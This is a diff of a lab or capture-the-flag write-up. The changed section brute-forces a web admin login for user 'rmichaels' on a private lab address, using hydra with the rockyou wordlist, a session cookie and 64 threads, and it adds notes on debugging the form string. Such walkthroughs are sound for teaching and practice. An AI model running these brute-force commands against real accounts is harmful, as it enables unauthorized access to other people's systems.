@@ -152,11 +152,11 @@ Got a hit on Roger S. Michaels's username.
 
 ### Bruteforce
 
-I'll try to brute force Roger's account using hydra and a list built into kali at `/usr/share/wordlists/*`. I'll start with the popular rockyou list. I was able to craft a http-form-post string in hydra thanks to Burpsuite and [this tutorial](http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html).
+I'll try to brute force Roger's account using hydra and a list built into kali at `/usr/share/wordlists/*`. I'll start with the popular rockyou list. After a few hours of false positives and 301 errors I was able to craft a http-form-post string in hydra thanks to Burpsuite, Wireshark lots of Googling. In the end, I found that it was a missing "=" that got the best of me.
 
 ```bash
 cd /usr/share/wordlists/
 gunzip ./rockyou.txt.gz
 
-hydra 172.16.1.76 http-form-post "/imfadministrator/:user=^USER^&pass=^PASS^:Invalid password" -l rmichaels -P /usr/share/wordlists/rockyou.txt
+hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 172.16.1.76 http-form-post "/imfadministrator/index.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=71jtqremlb5q74hge3apaog8d3" -t 64
 ```
